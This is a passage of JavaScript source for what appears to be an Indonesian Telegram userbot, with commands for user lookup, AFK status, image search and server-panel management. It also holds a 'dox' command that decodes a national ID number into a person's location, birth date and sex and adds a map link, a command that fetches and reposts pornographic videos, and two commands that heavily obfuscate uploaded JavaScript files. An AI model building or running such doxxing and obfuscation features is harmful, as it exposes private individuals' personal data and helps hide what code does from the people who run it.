                    await client.sendMessage(chatId, { message: `<blockquote>❌️ ɢᴀɢᴀʟ ʙʟᴏᴄᴋɪʀ ᴜsᴇʀ. ᴇʀʀᴏʀ: ${e.message.slice(0, 50)}...</blockquote>`, parseMode: 'html' });
                }
                break;

            case 'self':
                isSelfMode = true;
                await client.sendMessage(chatId, { message: "<blockquote>🤖 ʙᴏᴛ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴜʙᴀʜ ᴋᴇ ᴍᴏᴅᴇ <b>self</b></blockquote>", parseMode: 'html' });
                break;

            case 'public':
                isSelfMode = false;
                await client.sendMessage(chatId, { message: "<blockquote>🤖 ʙᴏᴛ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴜʙᴀʜ ᴋᴇ ᴍᴏᴅᴇ <b>Public</b></blockquote>", parseMode: 'html' });
                break;
                
            case 'info': {
  (async () => {
    let loadingMsg;
    try {
      const chatId = message.chat?.id || message.chatId;
      const text = (message.text || "").split(/\s+/).slice(1).join(" ");

      let targetUser = null;
      let isSelf = false;

      loadingMsg = await client.sendMessage(chatId, {
        message: "<blockquote>⏳ ᴍᴇɴɢᴀᴍʙɪʟ ɪɴғᴏʀᴍᴀsɪ useʀ...</blockquote>",
        parseMode: "html",
        replyTo: message.id
      });

      const replyMsg = message.replyTo ? await message.getReplyMessage() : null;
      if (replyMsg) {
        targetUser = await client.getEntity(
          replyMsg.senderId || replyMsg.fromId?.userId || replyMsg.sender?.id
        );
      }

      if (!targetUser && text) {
        try {
          targetUser = await client.getEntity(text);
        } catch {
          await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
          return client.sendMessage(chatId, {
            message: "<blockquote><b>❌ ᴜsᴇʀɴᴀᴍᴇ ᴀᴛᴀᴜ ɪᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</b></blockquote>",
            parseMode: "html",
            replyTo: message.id
          });
        }
      }

      if (!targetUser) {
        targetUser = await client.getEntity('me');
        isSelf = true;
      }

      const fullUser = await client.invoke(new Api.users.GetFullUser({ id: targetUser }));

      await client.editMessage(chatId, {
        message: loadingMsg.id,
        text: "<blockquote>⏳ ᴍᴇɴɢᴀᴍʙɪʟ ғᴏᴛᴏ ᴘʀᴏғɪʟ...</blockquote>",
        parseMode: "html"
      });

      const getProfilePhoto = async (userId) => {
        try {
          const photos = await client.invoke(
            new Api.photos.GetUserPhotos({
              userId: userId,
              offset: 0,
              maxId: 0,
              limit: 1
            })
          );

          if (photos && photos.count > 0 && photos.photos.length > 0) {
            return photos.photos[0];
          }
        } catch (e) {
          console.log("Method 1 gagal:", e.message);
        }

        try {
          if (fullUser.fullUser.profile_photo) {
            return fullUser.fullUser.profile_photo;
          }
        } catch (e) {
          console.log("Method 2 gagal:", e.message);
        }

        return null;
      };

      const profilePhoto = await getProfilePhoto(targetUser.id);
      const hasProfilePhoto = !!profilePhoto;

      const infoText = `
<blockquote>
👤 <b>ғᴜʟʟɴᴀᴍᴇ:</b> ${targetUser.firstName || ''} ${targetUser.lastName || ''}
🔖 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @${targetUser.username || 'N/A'}
🆔 <b>ɪᴅ:</b> <code>${targetUser.id}</code>
🌟 <b>ᴘʀᴇᴍɪᴜᴍ:</b> ${targetUser.isPremium ? 'Yes' : 'No'}
📝 <b>ʙɪᴏ:</b> ${fullUser.fullUser.about || 'No description'}
</blockquote>`;

      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });

      if (profilePhoto) {
        try {
          await client.sendFile(chatId, {
            file: profilePhoto,
            caption: infoText,
            parseMode: "html",
            replyTo: message.id
          });
        } catch (sendError) {
          console.log("Gagal kirim dengan foto:", sendError.message);
          await client.sendMessage(chatId, {
            message: infoText,
            parseMode: "html",
            replyTo: message.id
          });
        }
      } else {
        await client.sendMessage(chatId, {
          message: infoText,
          parseMode: "html",
          replyTo: message.id
        });
      }

    } catch (e) {
      console.error("Error info:", e);
      
      if (loadingMsg && loadingMsg.id) {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true });
      }
      
      await client.sendMessage(message.chat?.id || message.chatId, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴀᴍʙɪʟ ᴅᴀᴛᴀ ᴜsᴇʀ. ᴇʀʀᴏʀ: ${e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}
                
            case 'afk':
                if (afk.isAfk) {
                    return client.sendMessage(chatId, { message: "<blockquote>✅️ ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴋᴇ ᴍᴏᴅᴇ <b>AFK!</b></blockquote>", parseMode: 'html' });
                }
                afk.isAfk = true;
                afk.reason = text || 'No reason';
                afk.since = Date.now();
                await client.sendMessage(chatId, { message: `<blockquote>😴 <b>sᴇᴅᴀɴɢ AFK</b>.\n📝ʀᴇᴀsᴏɴ: <i>${afk.reason}</i></blockquote>`, parseMode: 'html' });
                break;
                
            case 'unafk':
                if (!afk.isAfk) {
                    return client.sendMessage(chatId, { message: "<blockquote>⚠️ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ AFK!</blockquote>", parseMode: 'html' });
                }
                afk.isAfk = false;
                afk.reason = "";
                afk.since = null;
                await client.sendMessage(chatId, { message: "<blockquote><b>✅️ ʙᴇʀʜᴀsɪʟ ᴍᴇɴᴏɴᴀᴋᴛɪғᴋᴀɴ AFK!</b></blockquote>", parseMode: 'html' });
                break;
                
case "xn": {
  (async () => {
    try {
      const chatId = message.chat?.id || message.chatId;
      const text = (message.text || "").split(/\s+/).slice(1).join(" ");

      if (!text) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: ${prefix}xn <kata kunci></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>⏳ ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ...\n🔍 ᴋᴀᴛᴀ ᴋᴜɴᴄɪ: <b>${text}</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const msgId = loadingMsg?.id || loadingMsg?.message?.id;

      const safeEdit = async (msgText) => {
        try {
          await client.editMessage(chatId, msgId, {
            message: msgText,
            parseMode: "html"
          });
        } catch {}
      };

      const safeDelete = async (msgObj) => {
        try {
          const delId = msgObj?.id || msgObj;
          if (delId)
            await client.invoke(
              new Api.messages.DeleteMessages({
                id: [delId],
                revoke: true
              })
            );
        } catch {}
      };

      await safeEdit(`🔍 <b>ᴍᴇɴᴄᴀʀɪ ᴠɪᴅᴇᴏ...</b>\n<b>ᴋᴀᴛᴀ ᴋᴜɴᴄɪ:</b> ${text}`);
      const res = await fetch(
        `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(text)}`
      );
      const data = await res.json();

      if (!data.status || !data.result?.length) {
        return safeEdit(`⚠️ ᴛɪᴅᴀᴋ ᴀᴅᴀ ʜᴀsɪʟ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴜɴᴛᴜᴋ: <b>${text}</b>`);
      }

      const top = data.result[0];
      const title = top.title || text;
      const link = top.link;

      await safeEdit(`⌛ <b>ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴇᴛᴀɪʟ ᴠɪᴅᴇᴏ...</b>\n🎬 ᴊᴜᴅᴜʟ: <b>${title}</b>`);
      const dlRes = await fetch(
        `https://restapi-v2.simplebot.my.id/download/xnxx?url=${encodeURIComponent(link)}`
      );
      const dlData = await dlRes.json();
      const result = dlData.result;
      const high = result.files?.high;

      if (!high) {
        return safeEdit(`⚠️ ᴠɪᴅᴇᴏ ᴛɪᴅᴀᴋ ᴍᴇᴍɪʟɪᴋɪ ᴋᴜᴀʟɪᴛᴀs <b>ʜɪɢʜ (HD)</b>\n\n<b>ᴊᴜᴅᴜʟ:</b> ${title}`);
      }

      await safeEdit(`📦 <b>ᴍᴇɴɢᴜɴᴅᴜʜ ᴠɪᴅᴇᴏ...</b>\n🎞 ʀᴇsᴏʟᴜsɪ: ʜɪɢʜ`);
      const videoRes = await fetch(high);
      const buffer = Buffer.from(await videoRes.arrayBuffer());
      const filePath = path.join(process.cwd(), `temp_${Date.now()}.mp4`);
      fs.writeFileSync(filePath, buffer);

      await safeEdit(`✅ <b>ᴠɪᴅᴇᴏ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</b>\n📤 ᴍᴇɴɢɪʀɪᴍ ᴋᴇ ᴄʜᴀᴛ...`);
      await safeDelete(loadingMsg);
      
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      await client.sendFile(chatId, {
        file: filePath,
        caption: `
<blockquote><b>🎬 𝐇𝐀𝐒𝐈𝐋 𝐕𝐈𝐃𝐄𝐎 𝐗𝐍𝐗𝐗</b>

📖 ᴊᴜᴅᴜʟ   : ${title}
📊 ʀᴇsᴏʟᴜsɪ: <b>ʜɪɢʜ</b>

© ʙʏ ʏᴀᴋᴜᴢᴀ 👑
</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
        forceDocument: false,
        supportsStreaming: true
      });

      fs.unlinkSync(filePath);
    } catch (e) {
      console.error("❌ Error .xn:", e);
      await client.sendMessage(message.chat?.id || message.chatId, {
        message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀᴛᴀ</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}
                
case "tourl":
  await tourlHandler(client, message, prefix);
  break;
                
case 'iqc':
  await handlerIqc(client, message, text, prefix);
  break;
  
case "1gb": await handleCreateSizeCommand("1gb", client, chatId, message, text, prefix); break;
case "2gb": await handleCreateSizeCommand("2gb", client, chatId, message, text, prefix); break;
case "3gb": await handleCreateSizeCommand("3gb", client, chatId, message, text, prefix); break;
case "4gb": await handleCreateSizeCommand("4gb", client, chatId, message, text, prefix); break;
case "5gb": await handleCreateSizeCommand("5gb", client, chatId, message, text, prefix); break;
case "6gb": await handleCreateSizeCommand("6gb", client, chatId, message, text, prefix); break;
case "7gb": await handleCreateSizeCommand("7gb", client, chatId, message, text, prefix); break;
case "8gb": await handleCreateSizeCommand("8gb", client, chatId, message, text, prefix); break;
case "9gb": await handleCreateSizeCommand("9gb", client, chatId, message, text, prefix); break;
case "10gb": await handleCreateSizeCommand("10gb", client, chatId, message, text, prefix); break;
case "unli": await handleCreateSizeCommand("unli", client, chatId, message, text, prefix); break;
case "adp": await handleADPCommand(client, chatId, message, text, prefix); break;
case "deladp": await handleDelADPCommand(client, chatId, message, text, prefix); break;
case "listadp": await handleListADPCommand(client, chatId, message); break;
case "listsrv": await handleListSrvCommand(client, chatId, message); break;
case "delsrv": await handleDelSrvCommand(client, chatId, message, text, prefix); break;
case "clearallsrv": await handleClearAllSrvCommand(client, chatId, message, text, prefix); break;
case "clearsrvoff": await handleClearSrvOffCommand(client, chatId, message, text, prefix); break;
case "clearalluser": await handleClearAllUserCommand(client, chatId, message, text, prefix); break;

async function pinterestSearch(query) {
  return new Promise((resolve, reject) => {
    gis({ searchTerm: `${query} site:id.pinterest.com` }, (err, results) => {
      if (err) return reject(new Error("Gagal mencari gambar."));
      if (!results || !results.length) return resolve([]);
      const urls = results.map(r => r.url).filter(Boolean);
      resolve(urls);
    });
  });
}

case 'pinterest':
  if (!text) {
    await client.sendMessage(chatId, {
      message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: <b>${prefix}pinterest [kata kunci]</b></blockquote>`,
      parseMode: "html"
    });
    break;
  }

  const loadingMsg = await client.sendMessage(chatId, {
    message: `<blockquote>🔍 ᴍᴇɴᴄᴀʀɪ ɢᴀᴍʙᴀʀ ᴜɴᴛᴜᴋ: <b>${escapeHtml(text)}</b></blockquote>`,
    parseMode: "html"
  });

  try {
    const results = await pinterestSearch(text);

    try {
      const msgId = loadingMsg?.id || loadingMsg?.message?.id;
      if (msgId) {
        await client.deleteMessages(chatId, [msgId], { revoke: true }).catch(() => {});
      }
    } catch (e) {
      console.warn("Gagal hapus pesan loading:", e.message);
    }

    if (!results || results.length === 0) {
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ʜᴀsɪʟ ᴜɴᴛᴜᴋ: <b>${escapeHtml(text)}</b></blockquote>`,
        parseMode: "html"
      });
      break;
    }

    const randomFive = results.sort(() => 0.5 - Math.random()).slice(0, 5);

    await client.sendMessage(chatId, {
      message: `<blockquote>✅ ᴍᴇɴᴇᴍᴜᴋᴀɴ ${randomFive.length} ɢᴀᴍʙᴀʀ ᴅᴀʀɪ: <b>${escapeHtml(text)}\n© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</b></blockquote>`,
      parseMode: "html"
    });

    for (const [i, url] of randomFive.entries()) {
      await client.sendFile(chatId, {
        file: url,
        caption: `<blockquote>🖼️ ɢᴀᴍʙᴀʀ ke-${i + 1}\nᴅᴀʀɪ ᴘᴇɴᴄᴀʀɪᴀɴ: <b>${escapeHtml(text)}</b></blockquote>`,
        parseMode: "html"
      });
      await new Promise(res => setTimeout(res, 1500));
    }

  } catch (err) {
    console.error("Pinterest Error:", err);

    try {
      const msgId = loadingMsg?.id || loadingMsg?.message?.id;
      if (msgId) {
        await client.deleteMessages(chatId, [msgId]).catch(() => {});
      }
    } catch {}

    await client.sendMessage(chatId, { message: "❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢᴀᴍʙɪʟ ɢᴀᴍʙᴀʀ.",  parseMode: "html", replyTo: message.id });
  }
  break;

case "getcode": {
  const text = message.message || message.text || "";
  const commandText = text.replace(/\.getcode\s*/, '').trim();
  await handlerGetCode(message, client, commandText, prefix);
  break;
}

case 'dox':
  try {
    if (!text) {
      await client.sendMessage(chatId, { 
        message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: <b>${prefix}dox 16070xxxxxxxxxxxx</b></blockquote>`,
        replyTo: message.id,
        parseMode: "html" 
      });
      break;
    }

    let nik;
    try {
      nik = nikParser(text.trim());
    } catch (e) {
      console.error("Parser error:", e);
      await client.sendMessage(chatId, { 
        message: "❌ NIK ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ ᴀᴛᴀᴜ ɢᴀɢᴀʟ ᴅɪᴘʀᴏsᴇs.",
        replyTo: message.id,
        parseMode: "html" 
      });
      break;
    }

    const provinsi = nik.province();
    const kabupaten = nik.kabupatenKota();
    const kecamatan = nik.kecamatan();
    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(`${kecamatan}, ${kabupaten}, ${provinsi}`)}`;

    const hasil = `
<blockquote>
🌐 <b>𝐇𝐀𝐒𝐈𝐋 𝐃𝐎𝐗𝐗𝐈𝐍𝐆 𝐍𝐈𝐊</b>

✅ <b>ɴɪᴋ ᴠᴀʟɪᴅ:</b> ${nik.isValid()}
🏙️ <b>ɪᴅ ᴘʀᴏᴠɪɴsɪ:</b> ${nik.provinceId()}
📌 <b>ᴘʀᴏᴠɪɴsɪ:</b> ${provinsi}
🏢 <b>ɪᴅ ᴋᴀʙᴜᴘᴀᴛᴇɴ:</b> ${nik.kabupatenKotaId()}
📌 <b>ᴋᴀʙᴜᴘᴀᴛᴇɴ:</b> ${kabupaten}
📍 <b>ɪᴅ ᴋᴇᴄᴀᴍᴀᴛᴀɴ:</b> ${nik.kecamatanId()}
📌 <b>ᴋᴇᴄᴀᴍᴀᴛᴀɴ:</b> ${kecamatan}
🏤 <b>ᴋᴏᴅᴇ ᴘᴏs:</b> ${nik.kodepos()}
🚻 <b>ᴊᴇɴɪs ᴋᴇʟᴀᴍɪɴ:</b> ${nik.kelamin()}
🎂 <b>ᴛᴀɴɢɢᴀʟ ʟᴀʜɪʀ:</b> ${nik.lahir()}
🔑 <b>ᴜɴɪǫᴄᴏᴅᴇ:</b> ${nik.uniqcode()}

📍 <b>ᴍᴀᴘs:</b> <a href="${mapsUrl}">Klik di sini</a>
</blockquote>`.trim();

    await client.sendMessage(chatId, { 
      message: hasil, 
      parseMode: "html", 
      linkPreview: false 
    });

  } catch (err) {
    console.error("Unhandled error in .dox:", err);
    await client.sendMessage(chatId, { 
      message: "<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ sᴀᴀᴛ ᴍᴇᴍᴘʀᴏsᴇs NIK.</blockquote>", 
      replyTo: message.id,
      parseMode: "html" 
    });
  }
  break;
  
case "encinvis": {
  const fileTempBase = `invisible-encrypted-${Date.now()} © ʙʏ ʏᴀᴋᴜᴢᴀ`;
  const STATUS_TEXT = "<blockquote>⌛️ ᴘʀᴏɢʀᴇss ᴍᴇɴɢᴏʙғᴜsᴄᴀᴛᴇ ɪɴᴠɪsɪʙʟᴇ ᴛᴜɴɢɢᴜ ʙᴇʙᴇʀᴀᴘᴀ ᴍᴇɴɪᴛ...</blockquote>";
  let outPath = null;
  let statusMsg = null;
  try {
    if (!message.replyTo) {
      await client.sendMessage(chatId, { message: `<blockquote>❌ ʙᴀʟᴀs ғɪʟᴇ .js ᴅᴇɴɢᴀɴ ${prefix}encinvis</blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    const repliedId = message.replyTo.replyToMsgId || message.replyTo.msgId || message.replyTo.id || null;
    if (!repliedId) {
      await client.sendMessage(chatId, { message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴇᴍᴜᴋᴀɴ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    let repliedArr;
    try {
      repliedArr = await client.getMessages(chatId, { ids: repliedId });
    } catch (e) {
      console.error("getMessages error:", e);
      repliedArr = null;
    }
    const replied = Array.isArray(repliedArr) ? repliedArr[0] : repliedArr;
    if (!replied) {
      await client.sendMessage(chatId, { message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    const doc =
      replied.document ||
      (replied.media && replied.media.document) ||
      (replied.media && replied.media.file) ||
      replied.media ||
      replied;

    const fileName =
      (doc.file_name ||
       doc.fileName ||
       (doc.attributes && Array.isArray(doc.attributes) && doc.attributes.find(a => a.file_name)?.file_name) ||
       (doc.document && (doc.document.file_name || doc.document.fileName)) ||
       (replied.file?.name) ||
       ""
      ).toString();

    if (!fileName.toLowerCase().endsWith(".js")) {
      await client.sendMessage(chatId, { message: "<blockquote>❌ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ ʙᴜᴋᴀɴ .js</blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    try {
      statusMsg = await client.sendMessage(chatId, { message: STATUS_TEXT, parseMode: "html", replyTo: message.id });
    } catch (e) {
      console.warn("gagal kirim status message:", e);
      statusMsg = null;
    }

    let buffer;
    try {
      buffer = await client.downloadMedia(doc);
    } catch (e) {
      console.error("downloadMedia error:", e);
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ: ${e.message || e}</blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    if (!buffer || buffer.length === 0) {
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
      await client.sendMessage(chatId, { message: "<blockquote>❌ ғɪʟᴇ ᴋᴏsᴏɴɢ sᴇᴛᴇʟᴀʜ ᴅᴏᴡɴʟᴏᴀᴅ</blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    let src = buffer.toString("utf8");
    try { new Function(src); } catch (syntaxErr) {
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ sʏɴᴛᴀx ᴇʀʀᴏʀ:\n<code>${syntaxErr.message}</code></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    let obfResult;
    try {
      obfResult = await JsConfuser.obfuscate(src, getStrongObfuscationConfig());
    } catch (e) {
      console.error("Obfuscate error:", e);
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴏʙғᴜsᴄᴀᴛɪᴏɴ: ${e.message || e}</blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    const obfuscatedCode = typeof obfResult === "string" ? obfResult : obfResult.code;
    try { new Function(obfuscatedCode); } catch (postErr) {
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ ʜᴀsɪʟ ᴏʙғᴜsᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ sᴇsᴜᴀɪ:\n<code>${postErr.message}</code></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    const safeName = fileName.replace(/[^a-zA-Z0-9._-]/g, "_");
    outPath = path.join(__dirname, `${fileTempBase}-${safeName}`);
    fs.writeFileSync(outPath, obfuscatedCode, "utf8");

    try {
      await client.sendMessage(chatId, { file: outPath, caption: `<blockquote>✅ ғɪʟᴇ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</blockquote>`, parseMode: "html", replyTo: message.id });
    } catch (e) {
      const outBuf = Buffer.from(obfuscatedCode, "utf8");
      try {
        await client.sendMessage(chatId, { file: outBuf, caption: `<blockquote>✅ ғɪʟᴇ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</blockquote>`, parseMode: "html", replyTo: message.id });
      } catch (e2) {
        console.error("send file fallback failed:", e2);
        if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
        await client.sendMessage(chatId, { message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ғɪʟᴇ: ${e2.message || e2}</blockquote>`, parseMode: "html", replyTo: message.id });
        break;
      }
    }

    if (statusMsg) {
      try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (e) { console.warn("gagal hapus status:", e); }
    }

    if (outPath && fs.existsSync(outPath)) {
      try { fs.unlinkSync(outPath); } catch (e) { console.warn("cannot unlink outPath:", e); }
    }

  } catch (err) {
    console.error("Unhandled error encinvis:", err);
    if (typeof statusMsg !== "undefined" && statusMsg && statusMsg.id) {
      try { await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }); } catch (_) {}
    }
    try {
      await client.sendMessage(chatId, { message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message || err}</blockquote>`, parseMode: "html", replyTo: message.id });
    } catch (_) {}
  }
  break;
}

case "encvar": {
  const fileTempBase = `var-encrypted-${Date.now()}`;
  const STATUS_TEXT = "<blockquote>⌛️ <b>ᴘʀᴏɢʀᴇss ᴍᴇɴɢᴏʙғᴜsᴄᴀᴛᴇ ᴠᴀʀ ᴛᴜɴɢɢᴜ ʙᴇʙᴇʀᴀᴘᴀ ᴍᴇɴɪᴛ...</b></blockquote>";
  let outPath = null;
  let statusMsg = null;

  try {
    if (!message.replyTo) {
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>ʙᴀʟᴀs ғɪʟᴇ .js ᴅᴇɴɢᴀɴ ${prefix}encvar</b></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
      break;
    }

    const repliedId = message.replyTo.replyToMsgId || message.replyTo.msgId || message.replyTo.id || null;
    if (!repliedId) {
      await client.sendMessage(chatId, { message: "<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴇᴍᴜᴋᴀɴ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</b></blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    let repliedArr;
    try {
      repliedArr = await client.getMessages(chatId, { ids: repliedId });
    } catch (e) {
      console.error("getMessages error:", e);
      repliedArr = null;
    }
    const replied = Array.isArray(repliedArr) ? repliedArr[0] : repliedArr;
    if (!replied) {
      await client.sendMessage(chatId, { message: "<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ</b></blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    const doc =
      replied.document ||
      (replied.media && replied.media.document) ||
      (replied.media && replied.media.file) ||
      replied.media ||
      replied;

    const fileName =
      (doc.file_name ||
       doc.fileName ||
       (doc.attributes && Array.isArray(doc.attributes) && doc.attributes.find(a => a.file_name)?.file_name) ||
       (doc.document && (doc.document.file_name || doc.document.fileName)) ||
       (replied.file?.name) ||
       ""
      ).toString();

    if (!fileName.toLowerCase().endsWith(".js")) {
      await client.sendMessage(chatId, { message: "<blockquote>❌ <b>ғɪʟᴇ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ ʙᴜᴋᴀɴ .js</b></blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    try {
      statusMsg = await client.sendMessage(chatId, { message: STATUS_TEXT, parseMode: "html", replyTo: message.id });
    } catch (e) {
      console.warn("gagal kirim status message:", e);
      statusMsg = null;
    }

    let buffer;
    try {
      buffer = await client.downloadMedia(doc);
    } catch (e) {
      console.error("downloadMedia error:", e);
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ғɪʟᴇ: ${e.message || e}</b></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    if (!buffer || buffer.length === 0) {
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      await client.sendMessage(chatId, { message: "<blockquote>❌ <b>ғɪʟᴇ ᴋᴏsᴏɴɢ sᴇᴛᴇʟᴀʜ ᴅᴏᴡɴʟᴏᴀᴅ</b></blockquote>", parseMode: "html", replyTo: message.id });
      break;
    }

    const src = buffer.toString("utf8");

    try { new Function(src); } catch (syntaxErr) {
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ <b>sʏɴᴛᴀx ᴇʀʀᴏʀ:\n<code>${syntaxErr.message}</code></b></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    let obfResult;
    try {
      obfResult = await JsConfuser.obfuscate(src, getNovaObfuscationConfig());
    } catch (e) {
      console.error("Obfuscate error:", e);
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴏʙғᴜsᴄᴀᴛɪᴏɴ: ${e.message || e}</b></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    const obfuscatedCode = typeof obfResult === "string" ? obfResult : (obfResult && obfResult.code) || "";
    try { new Function(obfuscatedCode); } catch (postErr) {
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ <b>ʜᴀsɪʟ ᴏʙғᴜsᴄᴀᴛɪᴏɴ ᴛɪᴅᴀᴋ sᴇsᴜᴀɪ:\n<code>${postErr.message}</b></code></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    const safeName = fileName.replace(/[^a-zA-Z0-9._-]/g, "_");
    outPath = path.join(__dirname, `${fileTempBase}-${safeName}`);
    try {
      fs.writeFileSync(outPath, obfuscatedCode, "utf8");
    } catch (e) {
      console.error("write file error:", e);
      if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      await client.sendMessage(chatId, { message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴʏɪᴍᴘᴀɴ ғɪʟᴇ sᴇᴍᴇɴᴛᴀʀᴀ: ${e.message || e}</b></blockquote>`, parseMode: "html", replyTo: message.id });
      break;
    }

    try {
      await client.sendMessage(chatId, { file: outPath, caption: `<blockquote>✅ <b>ғɪʟᴇ ʙᴇʀʜᴀsɪʟ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</b></blockquote>`, parseMode: "html", replyTo: message.id });
    } catch (e) {
      const outBuf = Buffer.from(obfuscatedCode, "utf8");
      try {
        await client.sendMessage(chatId, { file: outBuf, caption: `<blockquote>✅ <b>ғɪʟᴇ ʙᴇʀʜᴀsɪʟ ᴛᴇʀᴇɴᴋʀɪᴘsɪ: ${safeName}</b></blockquote>`, parseMode: "html", replyTo: message.id });
      } catch (e2) {
        console.error("send file fallback failed:", e2);
        if (statusMsg) try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
        await client.sendMessage(chatId, { message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪɴ ғɪʟᴇ: ${e2.message || e2}</b></blockquote>`, parseMode: "html", replyTo: message.id });
        break;
      }
    }

    if (statusMsg) {
